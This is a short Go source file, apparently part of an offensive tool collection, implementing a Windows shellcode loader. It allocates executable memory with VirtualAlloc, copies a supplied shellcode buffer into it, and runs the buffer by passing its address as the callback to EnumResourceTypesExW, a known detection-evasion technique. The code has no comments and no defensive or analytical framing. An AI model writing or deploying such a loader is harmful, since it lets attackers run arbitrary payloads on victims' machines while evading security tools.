package TT

import (
	"syscall"
	"unsafe"
)

var (
	timer int
	dummy [522]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NULL                   = 0
	RESOURCE_ENUM_VALIDATE = 0x0008
)

var (
	kernel32             = syscall.MustLoadDLL("kernel32.dll")
	ntdll                = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc         = kernel32.MustFindProc("VirtualAlloc")
	LoadLibraryW         = kernel32.MustFindProc("LoadLibraryW")
	EnumResourceTypesExW = kernel32.MustFindProc("EnumResourceTypesExW")
	RtlMoveMemory        = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	p1, _ := syscall.UTF16PtrFromString("Kernel32.dll")
	dll1, _, _ := LoadLibraryW.Call(uintptr(unsafe.Pointer(p1)))
	EnumResourceTypesExW.Call(dll1, addr, NULL, RESOURCE_ENUM_VALIDATE, NULL)
}
